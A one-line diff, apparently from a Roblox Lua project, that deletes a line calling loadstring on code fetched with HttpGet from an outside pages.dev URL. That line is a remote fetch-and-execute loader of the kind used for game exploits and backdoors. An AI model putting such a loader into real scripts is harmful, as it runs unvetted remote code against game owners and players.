@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://maxitom.pages.dev/raw/Pbw0ZF1w"))()
